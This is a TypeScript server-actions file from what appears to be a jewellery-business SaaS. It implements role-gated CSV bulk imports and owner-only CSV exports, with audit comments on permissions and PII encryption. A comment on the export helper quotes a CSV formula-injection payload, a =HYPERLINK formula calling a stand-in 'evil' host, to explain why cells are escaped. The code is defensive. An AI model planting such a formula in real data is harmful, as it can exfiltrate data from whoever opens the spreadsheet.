"use server";

import { createClient } from "@/lib/supabase/server";
import { createAdminClient } from "@/lib/supabase/admin";
import { logger } from "@/lib/logger";
import { requireRole } from "@/lib/auth-context";
import { buildCsv } from "@/lib/csv/escape";
import { decryptCustomerPiiList, buildEncryptedCustomerPiiUpdate } from "@/lib/customer-pii";

import { flushSentry } from "@/lib/sentry-flush";
// ──────────────────────────────────────────────────────────
// Auth helper
// ──────────────────────────────────────────────────────────

async function getAuthContext() {
  const supabase = await createClient();
  const {
    data: { user },
  } = await supabase.auth.getUser();
  if (!user) throw new Error("Not authenticated");

  const { data: userData } = await supabase
    .from("users")
    .select("tenant_id")
    .eq("id", user.id)
    .single();

  if (!userData?.tenant_id) throw new Error("No tenant found");
  return { supabase, userId: user.id, tenantId: userData.tenant_id };
}

/**
 * Group 15 audit: bulk-import is high blast-radius — a single CSV can
 * inject thousands of rows into customers / inventory / repairs / sales
 * across the tenant. Pre-fix every importX function only checked
 * `getAuthContext` (authenticated + has-tenant), so a salesperson or
 * workshop staffer could bulk-replace customer records, flood the
 * inventory with synthetic rows, or stub-out fake sales. Aligning with
 * the export side of this file (which already requires owner via
 * getExportContext) and with /migration which is owner+manager-gated.
 *
 * Owner+manager only — same blast-radius as scheduled reports + email
 * domain config.
 */
async function getImportContext() {
  const ctx = await getAuthContext();
  try {
    await requireRole("owner", "manager");
  } catch (err) {
    const msg = err instanceof Error ? err.message : "permission_denied";
    throw new Error(
      msg.startsWith("permission_denied")
        ? "Only owner or manager can run bulk imports."
        : "Not authenticated",
    );
  }
  return ctx;
}

function chunk<T>(arr: T[], size: number): T[][] {
  const chunks: T[][] = [];
  for (let i = 0; i < arr.length; i += size) chunks.push(arr.slice(i, i + size));
  return chunks;
}

export type ImportResult = { imported: number; errors: { row: number; reason: string }[] };

// ──────────────────────────────────────────────────────────
// SUPPLIERS
// ──────────────────────────────────────────────────────────

export interface SupplierRow {
  name: string;
  contact_name?: string;
  email?: string;
  phone?: string;
  address?: string;
  notes?: string;
}

export async function importSuppliers(rows: SupplierRow[]): Promise<ImportResult> {
  try {
    const { supabase, tenantId } = await getImportContext();
    const errors: { row: number; reason: string }[] = [];
    let imported = 0;

    for (const [idx, chunk_] of chunk(rows, 50).entries()) {
      const valid: { record: Record<string, unknown>; rowNum: number }[] = [];
      chunk_.forEach((r, i) => {
        const rowNum = idx * 50 + i + 2; // 1-indexed + header row
        if (!r.name?.trim()) {
          errors.push({ row: rowNum, reason: "Missing required field: name" });
          return;
        }
        valid.push({
          rowNum,
          record: {
            tenant_id: tenantId,
            name: r.name.trim(),
            contact_name: r.contact_name?.trim() || null,
            email: r.email?.trim() || null,
            phone: r.phone?.trim() || null,
            address: r.address?.trim() || null,
            notes: r.notes?.trim() || null,
          },
        });
      });

      if (valid.length === 0) continue;

      // Upsert on (tenant_id, name) - no unique constraint exists so we do insert with conflict handling
      for (const { record, rowNum } of valid) {
        // Check if supplier with same name exists
        const { data: existing } = await supabase
          .from("suppliers")
          .select("id")
          .eq("tenant_id", tenantId)
          .eq("name", record.name as string)
          .maybeSingle();

        if (existing) {
          const { error } = await supabase
            .from("suppliers")
            .update(record)
            .eq("id", existing.id);
          if (error) errors.push({ row: rowNum, reason: error.message });
          else imported++;
        } else {
          const { error } = await supabase.from("suppliers").insert(record);
          if (error) errors.push({ row: rowNum, reason: error.message });
          else imported++;
        }
      }
    }

    return { imported, errors };
  } catch (error) {
    logger.error("importSuppliers failed", { error });
    await flushSentry();
    return { imported: 0, errors: [{ row: 0, reason: "Operation failed" }] };
  }
}

// ──────────────────────────────────────────────────────────
// INVENTORY
// ──────────────────────────────────────────────────────────

export interface InventoryRow {
  name: string;
  sku?: string;
  description?: string;
  category?: string;
  metal_type?: string;
  stone_type?: string;
  stone_carat?: string | number;
  weight_grams?: string | number;
  cost_price?: string | number;
  retail_price?: string | number;
  quantity?: string | number;
  status?: string;
  location?: string;
  supplier_name?: string;
  tags?: string;
}

export async function importInventory(rows: InventoryRow[]): Promise<ImportResult> {
  try {
    const { supabase, tenantId } = await getImportContext();
    const errors: { row: number; reason: string }[] = [];
    let imported = 0;

    // Pre-fetch all suppliers for this tenant
    const { data: suppliers } = await supabase
      .from("suppliers")
      .select("id, name")
      .eq("tenant_id", tenantId);
    const supplierMap = new Map((suppliers || []).map((s) => [s.name.toLowerCase(), s.id]));

    for (const [idx, chunk_] of chunk(rows, 50).entries()) {
      const records: Record<string, unknown>[] = [];
      const rowNums: number[] = [];

      chunk_.forEach((r, i) => {
        const rowNum = idx * 50 + i + 2;
        if (!r.name?.trim()) {
          errors.push({ row: rowNum, reason: "Missing required field: name" });
          return;
        }

        const supplierId = r.supplier_name
          ? supplierMap.get(r.supplier_name.toLowerCase()) || null
          : null;

        records.push({
          tenant_id: tenantId,
          name: r.name.trim(),
          sku: r.sku?.trim() || null,
          description: r.description?.trim() || null,
          category: r.category?.trim() || null,
          metal: r.metal_type?.trim() || null,
          stone: r.stone_type?.trim() || null,
          carat: r.stone_carat ? parseFloat(String(r.stone_carat)) : null,
          weight_grams: r.weight_grams ? parseFloat(String(r.weight_grams)) : null,
          cost_price: r.cost_price ? parseFloat(String(r.cost_price)) : null,
          retail_price: r.retail_price ? parseFloat(String(r.retail_price)) : null,
          quantity: r.quantity ? parseInt(String(r.quantity)) : 0,
          status: r.status?.trim() || "in_stock",
          location: r.location?.trim() || null,
          supplier_id: supplierId,
          tags: r.tags ? r.tags.split(";").map((t) => t.trim()).filter(Boolean) : [],
        });
        rowNums.push(rowNum);
      });

      if (records.length === 0) continue;

      const { error } = await supabase
        .from("inventory")
        .insert(records);

      if (error) {
        errors.push({ row: rowNums[0], reason: `Batch error: ${error.message}` });
      } else {
        imported += records.length;
      }
    }

    return { imported, errors };
  } catch (error) {
    logger.error("importInventory failed", { error });
    await flushSentry();
    return { imported: 0, errors: [{ row: 0, reason: "Operation failed" }] };
  }
}

// ──────────────────────────────────────────────────────────
// CUSTOMERS
// ──────────────────────────────────────────────────────────

export interface CustomerRow {
  first_name?: string;
  last_name?: string;
  full_name?: string;
  email?: string;
  phone?: string;
  mobile?: string;
  address?: string;
  birthday?: string;
  ring_size?: string;
  is_vip?: string | boolean;
  preferred_metal?: string;
  preferred_stone?: string;
  notes?: string;
}

export async function importCustomers(rows: CustomerRow[]): Promise<ImportResult> {
  try {
    const { supabase, tenantId } = await getImportContext();
    const errors: { row: number; reason: string }[] = [];
    let imported = 0;

    for (const [idx, chunk_] of chunk(rows, 50).entries()) {
      for (const [i, r] of chunk_.entries()) {
        const rowNum = idx * 50 + i + 2;
        const fullName = r.full_name?.trim() ||
          [r.first_name?.trim(), r.last_name?.trim()].filter(Boolean).join(" ");

        if (!fullName) {
          errors.push({ row: rowNum, reason: "Missing required field: name" });
          continue;
        }

        // W6-HIGH-14 phase 3: PII fields go through buildEncrypted... so
        // they land in pii_enc and the plaintext mirror columns are
        // null. Non-PII fields (full_name, email, phone, mobile,
        // birthday, is_vip) stay plaintext per the deferred-fields
        // policy.
        const piiUpdate = await buildEncryptedCustomerPiiUpdate({
          address: r.address?.trim() || null,
          ring_size: r.ring_size?.trim() || null,
          preferred_metal: r.preferred_metal?.trim() || null,
          preferred_stone: r.preferred_stone?.trim() || null,
          notes: r.notes?.trim() || null,
        });
        const record: Record<string, unknown> = {
          tenant_id: tenantId,
          full_name: fullName,
          email: r.email?.trim() || null,
          phone: r.phone?.trim() || null,
          mobile: r.mobile?.trim() || null,
          birthday: r.birthday?.trim() || null,
          is_vip: r.is_vip === "true" || r.is_vip === true || r.is_vip === "yes" || r.is_vip === "1",
          ...piiUpdate,
        };

        // Upsert on email if provided
        if (record.email) {
          const { data: existing } = await supabase
            .from("customers")
            .select("id")
            .eq("tenant_id", tenantId)
            .eq("email", record.email as string)
            .maybeSingle();

          if (existing) {
            const { error } = await supabase
              .from("customers")
              .update(record)
              .eq("id", existing.id);
            if (error) errors.push({ row: rowNum, reason: error.message });
            else imported++;
            continue;
          }
        }

        const { error } = await supabase.from("customers").insert(record);
        if (error) errors.push({ row: rowNum, reason: error.message });
        else imported++;
      }
    }

    return { imported, errors };
  } catch (error) {
    logger.error("importCustomers failed", { error });
    await flushSentry();
    return { imported: 0, errors: [{ row: 0, reason: "Operation failed" }] };
  }
}

// ──────────────────────────────────────────────────────────
// REPAIRS
// ──────────────────────────────────────────────────────────

export interface RepairRow {
  customer_email?: string;
  item_description: string;
  work_required?: string;
  technician?: string;
  estimated_cost?: string | number;
  due_date?: string;
  status?: string;
  notes?: string;
}

export async function importRepairs(rows: RepairRow[]): Promise<ImportResult> {
  try {
    const { supabase, tenantId } = await getImportContext();
    const errors: { row: number; reason: string }[] = [];
    let imported = 0;

    // Build customer email→id map
    const { data: customers } = await supabase
      .from("customers")
      .select("id, email")
      .eq("tenant_id", tenantId)
      .not("email", "is", null);
    const customerMap = new Map((customers || []).map((c) => [c.email.toLowerCase(), c.id]));

    for (const [idx, chunk_] of chunk(rows, 50).entries()) {
      const records: Record<string, unknown>[] = [];
      const rowNums: number[] = [];

      chunk_.forEach((r, i) => {
        const rowNum = idx * 50 + i + 2;
        if (!r.item_description?.trim()) {
          errors.push({ row: rowNum, reason: "Missing required field: item_description" });
          return;
        }

        const customerId = r.customer_email
          ? customerMap.get(r.customer_email.toLowerCase()) || null
          : null;

        records.push({
          tenant_id: tenantId,
          customer_id: customerId,
          customer_email: r.customer_email?.trim() || null,
          item_description: r.item_description.trim(),
          work_required: r.work_required?.trim() || null,
          technician: r.technician?.trim() || null,
          estimated_cost: r.estimated_cost ? parseFloat(String(r.estimated_cost)) : null,
          due_date: r.due_date?.trim() || null,
          status: r.status?.trim() || "intake",
          notes: r.notes?.trim() || null,
        });
        rowNums.push(rowNum);
      });

      if (records.length === 0) continue;

      const { error } = await supabase.from("repairs").insert(records);
      if (error) errors.push({ row: rowNums[0], reason: `Batch error: ${error.message}` });
      else imported += records.length;
    }

    return { imported, errors };
  } catch (error) {
    logger.error("importRepairs failed", { error });
    await flushSentry();
    return { imported: 0, errors: [{ row: 0, reason: "Operation failed" }] };
  }
}

// ──────────────────────────────────────────────────────────
// BESPOKE JOBS
// ──────────────────────────────────────────────────────────

export interface BespokeJobRow {
  customer_email?: string;
  title: string;
  description?: string;
  stage?: string;
  metal_type?: string;
  stone_type?: string;
  estimated_cost?: string | number;
  deposit_paid?: string | number | boolean;
  due_date?: string;
  notes?: string;
}

export async function importBespokeJobs(rows: BespokeJobRow[]): Promise<ImportResult> {
  try {
    const { supabase, tenantId } = await getImportContext();
    const errors: { row: number; reason: string }[] = [];
    let imported = 0;

    const { data: customers } = await supabase
      .from("customers")
      .select("id, email")
      .eq("tenant_id", tenantId)
      .not("email", "is", null);
    const customerMap = new Map((customers || []).map((c) => [c.email.toLowerCase(), c.id]));

    for (const [idx, chunk_] of chunk(rows, 50).entries()) {
      const records: Record<string, unknown>[] = [];
      const rowNums: number[] = [];

      chunk_.forEach((r, i) => {
        const rowNum = idx * 50 + i + 2;
        if (!r.title?.trim()) {
          errors.push({ row: rowNum, reason: "Missing required field: title" });
          return;
        }

        const customerId = r.customer_email
          ? customerMap.get(r.customer_email.toLowerCase()) || null
          : null;

        records.push({
          tenant_id: tenantId,
          customer_id: customerId,
          customer_email: r.customer_email?.trim() || null,
          title: r.title.trim(),
          description: r.description?.trim() || null,
          stage: r.stage?.trim() || "enquiry",
          metal_type: r.metal_type?.trim() || null,
          stone_type: r.stone_type?.trim() || null,
          estimated_cost: r.estimated_cost ? parseFloat(String(r.estimated_cost)) : null,
          deposit_received: r.deposit_paid === true || r.deposit_paid === "true" || r.deposit_paid === "yes" || r.deposit_paid === "1" || r.deposit_paid === 1,
          due_date: r.due_date?.trim() || null,
          notes: r.notes?.trim() || null,
        });
        rowNums.push(rowNum);
      });

      if (records.length === 0) continue;

      const { error } = await supabase.from("bespoke_jobs").insert(records);
      if (error) errors.push({ row: rowNums[0], reason: `Batch error: ${error.message}` });
      else imported += records.length;
    }

    return { imported, errors };
  } catch (error) {
    logger.error("importBespokeJobs failed", { error });
    await flushSentry();
    return { imported: 0, errors: [{ row: 0, reason: "Operation failed" }] };
  }
}

// ──────────────────────────────────────────────────────────
// SALES
// ──────────────────────────────────────────────────────────

export interface SaleRow {
  customer_email?: string;
  item_name: string;
  quantity?: string | number;
  unit_price?: string | number;
  discount?: string | number;
  payment_method?: string;
  payment_status?: string;
  notes?: string;
}

export async function importSales(rows: SaleRow[]): Promise<ImportResult> {
  try {
    const { supabase, tenantId } = await getImportContext();
    const errors: { row: number; reason: string }[] = [];
    let imported = 0;

    const { data: customers } = await supabase
      .from("customers")
      .select("id, email, full_name")
      .eq("tenant_id", tenantId)
      .not("email", "is", null);
    const customerMap = new Map(
      (customers || []).map((c) => [c.email.toLowerCase(), { id: c.id, name: c.full_name }])
    );

    // Get current sale count for numbering
    const { count: saleCount } = await supabase
      .from("sales")
      .select("id", { count: "exact", head: true })
      .eq("tenant_id", tenantId);

    let counter = (saleCount || 0) + 1;

    for (const [idx, r] of rows.entries()) {
      const rowNum = idx + 2;
      if (!r.item_name?.trim()) {
        errors.push({ row: rowNum, reason: "Missing required field: item_name" });
        continue;
      }

      const customerData = r.customer_email
        ? customerMap.get(r.customer_email.toLowerCase()) || null
        : null;

      const qty = r.quantity ? parseInt(String(r.quantity)) : 1;
      const unitPrice = r.unit_price ? parseFloat(String(r.unit_price)) : 0;
      const discountPct = r.discount ? parseFloat(String(r.discount)) : 0;
      const lineTotal = unitPrice * qty * (1 - discountPct / 100);

      const saleNumber = `SALE-${String(counter).padStart(4, "0")}`;
      counter++;

      const paymentMethod = r.payment_method?.toLowerCase();
      const validPayments = ["cash", "card", "transfer", "layby", "account", "mixed"];
      const paymentStatus = r.payment_status?.toLowerCase();
      const validStatuses = ["quote", "confirmed", "paid", "completed", "refunded", "layby"];

      const { data: sale, error: saleError } = await supabase
        .from("sales")
        .insert({
          tenant_id: tenantId,
          sale_number: saleNumber,
          customer_id: customerData?.id || null,
          customer_email: r.customer_email?.trim() || null,
          customer_name: customerData?.name || null,
          status: validStatuses.includes(paymentStatus || "") ? paymentStatus : "confirmed",
          payment_method: validPayments.includes(paymentMethod || "") ? paymentMethod : null,
          subtotal: lineTotal,
          total: lineTotal,
          amount_paid: paymentStatus === "paid" ? lineTotal : 0,
          notes: r.notes?.trim() || null,
        })
        .select("id")
        .single();

      if (saleError || !sale) {
        errors.push({ row: rowNum, reason: saleError?.message || "Failed to create sale" });
        continue;
      }

      // Insert sale item
      const { error: itemError } = await supabase.from("sale_items").insert({
        tenant_id: tenantId,
        sale_id: sale.id,
        description: r.item_name.trim(),
        quantity: qty,
        unit_price: unitPrice,
        discount_percent: discountPct,
        line_total: lineTotal,
      });

      if (itemError) {
        errors.push({ row: rowNum, reason: `Item error: ${itemError.message}` });
      } else {
        imported++;
      }
    }

    return { imported, errors };
  } catch (error) {
    logger.error("importSales failed", { error });
    await flushSentry();
    return { imported: 0, errors: [{ row: 0, reason: "Operation failed" }] };
  }
}

// ──────────────────────────────────────────────────────────
// EXPORT HELPERS
// ──────────────────────────────────────────────────────────

/**
 * W6-CRIT-05: every CSV export dumps tenant-wide PII / financials. Only the
 * owner should be able to pull full data out of the system — staff must not
 * be able to hit these endpoints directly (even though UI hides them).
 * Return null on a denied caller so every export function degrades the same
 * way ("Unauthorized" + empty csv).
 */
async function getExportContext() {
  try {
    const ctx = await requireRole("owner");
    return { tenantId: ctx.tenantId };
  } catch {
    return null;
  }
}

/**
 * W6-HIGH-05 / W4-REPORT8: CSV exports now route through `buildCsv`
 * in `@/lib/csv/escape`, which prefixes cells starting with `=`, `+`,
 * `-`, `@`, `\t`, `\r` with an apostrophe before quoting. Without this,
 * a customer whose name was `=HYPERLINK("http://evil",...)` would turn
 * into a live formula on every owner's Excel when they opened the
 * export — data exfiltration or arbitrary DDE exec.
 */
function buildCSVString(headers: string[], rows: Record<string, unknown>[]): string {
  return buildCsv(headers, rows);
}

// ──────────────────────────────────────────────────────────
// EXPORT CUSTOMERS
// ──────────────────────────────────────────────────────────

export async function exportCustomers(): Promise<{ csv: string; error?: string }> {
  try {
    const ctx = await getExportContext();
    if (!ctx) return { csv: "", error: "Unauthorized" };

    const adminClient = createAdminClient();
    const { data } = await adminClient
      .from("customers")
      .select("id,full_name,email,mobile,phone,address,birthday,ring_size,is_vip,notes,created_at,pii_enc")
      .eq("tenant_id", ctx.tenantId)
      .is("deleted_at", null)
      .order("created_at", { ascending: true });

    if (!data) return { csv: "", error: "No data" };

    // W6-HIGH-14: decrypt PII bundle before exposing in CSV.
    const decrypted = await decryptCustomerPiiList(data);

    const headers = ["id","full_name","email","mobile","phone","address","birthday","ring_size","is_vip","notes","created_at"];
    return { csv: buildCSVString(headers, decrypted) };
  } catch (error) {
    logger.error("exportCustomers failed", { error });
    await flushSentry();
    return { csv: "", error: "Operation failed" };
  }
}

// ──────────────────────────────────────────────────────────
// EXPORT INVOICES
// ──────────────────────────────────────────────────────────

export async function exportInvoices(): Promise<{ csv: string; error?: string }> {
  try {
    const ctx = await getExportContext();
    if (!ctx) return { csv: "", error: "Unauthorized" };

    const adminClient = createAdminClient();
    const { data } = await adminClient
      .from("invoices")
      .select("id,invoice_number,status,invoice_date,due_date,subtotal,tax_amount,discount_amount,total,amount_paid,notes,created_at,customers(full_name,email)")
      .eq("tenant_id", ctx.tenantId)
      .order("created_at", { ascending: true });

    if (!data) return { csv: "", error: "No data" };

    const headers = ["id","invoice_number","customer_name","customer_email","status","invoice_date","due_date","subtotal","tax_amount","discount_amount","total","amount_paid","notes","created_at"];
    const rows = data.map((r) => ({
      id: r.id,
      invoice_number: r.invoice_number,
      customer_name: (r.customers as { full_name?: string } | null)?.full_name ?? "",
      customer_email: (r.customers as { email?: string } | null)?.email ?? "",
      status: r.status,
      invoice_date: r.invoice_date,
      due_date: r.due_date,
      subtotal: r.subtotal,
      tax_amount: r.tax_amount,
      discount_amount: r.discount_amount,
      total: r.total,
      amount_paid: r.amount_paid,
      notes: r.notes,
      created_at: r.created_at,
    }));

    return { csv: buildCSVString(headers, rows) };
  } catch (error) {
    logger.error("exportInvoices failed", { error });
    await flushSentry();
    return { csv: "", error: "Operation failed" };
  }
}

// ──────────────────────────────────────────────────────────
// EXPORT REPAIRS
// ──────────────────────────────────────────────────────────

export async function exportRepairs(): Promise<{ csv: string; error?: string }> {
  try {
    const ctx = await getExportContext();
    if (!ctx) return { csv: "", error: "Unauthorized" };

    const adminClient = createAdminClient();
    const { data } = await adminClient
      .from("repairs")
      .select("id,repair_number,item_type,item_description,repair_type,stage,quoted_price,final_price,due_date,created_at,customers(full_name,email)")
      .eq("tenant_id", ctx.tenantId)
      .order("created_at", { ascending: true });

    if (!data) return { csv: "", error: "No data" };

    const headers = ["id","repair_number","customer_name","customer_email","item_type","item_description","repair_type","stage","quoted_price","final_price","due_date","created_at"];
    const rows = data.map((r) => ({
      id: r.id,
      repair_number: r.repair_number,
      customer_name: (r.customers as { full_name?: string } | null)?.full_name ?? "",
      customer_email: (r.customers as { email?: string } | null)?.email ?? "",
      item_type: r.item_type,
      item_description: r.item_description,
      repair_type: r.repair_type,
      stage: r.stage,
      quoted_price: r.quoted_price,
      final_price: r.final_price,
      due_date: r.due_date,
      created_at: r.created_at,
    }));

    return { csv: buildCSVString(headers, rows) };
  } catch (error) {
    logger.error("exportRepairs failed", { error });
    await flushSentry();
    return { csv: "", error: "Operation failed" };
  }
}

// ──────────────────────────────────────────────────────────
// EXPORT BESPOKE JOBS
// ──────────────────────────────────────────────────────────

export async function exportBespokeJobs(): Promise<{ csv: string; error?: string }> {
  try {
    const ctx = await getExportContext();
    if (!ctx) return { csv: "", error: "Unauthorized" };

    const adminClient = createAdminClient();
    const { data } = await adminClient
      .from("bespoke_jobs")
      .select("id,job_number,title,stage,metal_type,stone_type,quoted_price,deposit_amount,deposit_received,due_date,created_at,customers(full_name,email)")
      .eq("tenant_id", ctx.tenantId)
      .order("created_at", { ascending: true });

    if (!data) return { csv: "", error: "No data" };

    const headers = ["id","job_number","customer_name","customer_email","title","stage","metal_type","stone_type","quoted_price","deposit_amount","deposit_paid","due_date","created_at"];
    const rows = data.map((r) => ({
      id: r.id,
      job_number: r.job_number,
      customer_name: (r.customers as { full_name?: string } | null)?.full_name ?? "",
      customer_email: (r.customers as { email?: string } | null)?.email ?? "",
      title: r.title,
      stage: r.stage,
      metal_type: r.metal_type,
      stone_type: r.stone_type,
      quoted_price: r.quoted_price,
      deposit_amount: r.deposit_amount,
      deposit_paid: r.deposit_received,  // Export as deposit_paid for backward compatibility
      due_date: r.due_date,
      created_at: r.created_at,
    }));

    return { csv: buildCSVString(headers, rows) };
  } catch (error) {
    logger.error("exportBespokeJobs failed", { error });
    await flushSentry();
    return { csv: "", error: "Operation failed" };
  }
}

// ──────────────────────────────────────────────────────────
// EXPORT SALES
// ──────────────────────────────────────────────────────────

export async function exportSales(): Promise<{ csv: string; error?: string }> {
  try {
    const ctx = await getExportContext();
    if (!ctx) return { csv: "", error: "Unauthorized" };

    const adminClient = createAdminClient();
    const { data } = await adminClient
      .from("sales")
      .select("id,sale_number,customer_name,customer_email,status,payment_method,subtotal,tax_amount,discount_amount,total,amount_paid,sale_date,created_at")
      .eq("tenant_id", ctx.tenantId)
      .order("created_at", { ascending: true });

    if (!data) return { csv: "", error: "No data" };

    const headers = ["id","sale_number","customer_name","customer_email","status","payment_method","subtotal","tax_amount","discount_amount","total","amount_paid","sale_date","created_at"];
    return { csv: buildCSVString(headers, data) };
  } catch (error) {
    logger.error("exportSales failed", { error });
    await flushSentry();
    return { csv: "", error: "Operation failed" };
  }
}

// ──────────────────────────────────────────────────────────
// EXPORT INVENTORY
// ──────────────────────────────────────────────────────────

export async function exportInventory(): Promise<{ csv: string; error?: string }> {
  try {
    const ctx = await getExportContext();
    if (!ctx) return { csv: "", error: "Unauthorized" };

    const adminClient = createAdminClient();
    const { data } = await adminClient
      .from("inventory")
      .select("id,name,sku,description,category,metal,stone,carat,weight_grams,cost_price,retail_price,quantity,status,location,created_at")
      .eq("tenant_id", ctx.tenantId)
      .order("created_at", { ascending: true });

    if (!data) return { csv: "", error: "No data" };

    const headers = ["id","name","sku","description","category","metal","stone","carat","weight_grams","cost_price","retail_price","quantity","status","location","created_at"];
    return { csv: buildCSVString(headers, data) };
  } catch (error) {
    logger.error("exportInventory failed", { error });
    await flushSentry();
    return { csv: "", error: "Operation failed" };
  }
}

// ──────────────────────────────────────────────────────────
// EXPORT EXPENSES
// ──────────────────────────────────────────────────────────

export async function exportExpenses(): Promise<{ csv: string; error?: string }> {
  try {
    const ctx = await getExportContext();
    if (!ctx) return { csv: "", error: "Unauthorized" };

    const adminClient = createAdminClient();
    const { data } = await adminClient
      .from("expenses")
      .select("id,description,category,amount,invoice_ref,expense_date,notes,created_at")
      .eq("tenant_id", ctx.tenantId)
      .order("created_at", { ascending: true });

    if (!data) return { csv: "", error: "No data" };

    const headers = ["id","description","category","amount","invoice_ref","expense_date","notes","created_at"];
    return { csv: buildCSVString(headers, data) };
  } catch (error) {
    logger.error("exportExpenses failed", { error });
    await flushSentry();
    return { csv: "", error: "Operation failed" };
  }
}

// ──────────────────────────────────────────────────────────
// EXPORT SUPPLIERS
// ──────────────────────────────────────────────────────────

export async function exportSuppliers(): Promise<{ csv: string; error?: string }> {
  try {
    const ctx = await getExportContext();
    if (!ctx) return { csv: "", error: "Unauthorized" };

    const adminClient = createAdminClient();
    const { data } = await adminClient
      .from("suppliers")
      .select("id,name,contact_name,email,phone,address,notes,created_at")
      .eq("tenant_id", ctx.tenantId)
      .order("created_at", { ascending: true });

    if (!data) return { csv: "", error: "No data" };

    const headers = ["id","name","contact_name","email","phone","address","notes","created_at"];
    return { csv: buildCSVString(headers, data) };
  } catch (error) {
    logger.error("exportSuppliers failed", { error });
    await flushSentry();
    return { csv: "", error: "Operation failed" };
  }
}

// ──────────────────────────────────────────────────────────────
// FULL DATA EXPORT (Download All)
// ──────────────────────────────────────────────────────────────

export async function exportAllData(): Promise<{
  success: boolean;
  data?: Record<string, string>;
  error?: string
}> {
  try {
    // W6-CRIT-05: full-tenant PII export. Owner-only, hard gate.
    try {
      await requireRole("owner");
    } catch {
      return { success: false, error: "Only the account owner can export all data." };
    }

    // Export all entities in parallel
    const [
      customers,
      invoices,
      repairs,
      bespokeJobs,
      sales,
      inventory,
      expenses,
      suppliers,
    ] = await Promise.all([
      exportCustomers(),
      exportInvoices(),
      exportRepairs(),
      exportBespokeJobs(),
      exportSales(),
      exportInventory(),
      exportExpenses(),
      exportSuppliers(),
    ]);

    // Check for errors
    const errors = [
      customers.error,
      invoices.error,
      repairs.error,
      bespokeJobs.error,
      sales.error,
      inventory.error,
      expenses.error,
      suppliers.error,
    ].filter(Boolean);

    if (errors.length > 0) {
      return { success: false, error: errors.join('; ') };
    }

    return {
      success: true,
      data: {
        'customers.csv': customers.csv,
        'invoices.csv': invoices.csv,
        'repairs.csv': repairs.csv,
        'bespoke_jobs.csv': bespokeJobs.csv,
        'sales.csv': sales.csv,
        'inventory.csv': inventory.csv,
        'expenses.csv': expenses.csv,
        'suppliers.csv': suppliers.csv,
      },
    };
  } catch (error) {
    logger.error("exportAllData failed", { error });
    await flushSentry();
    return { success: false, error: "Failed to export data" };
  }
}
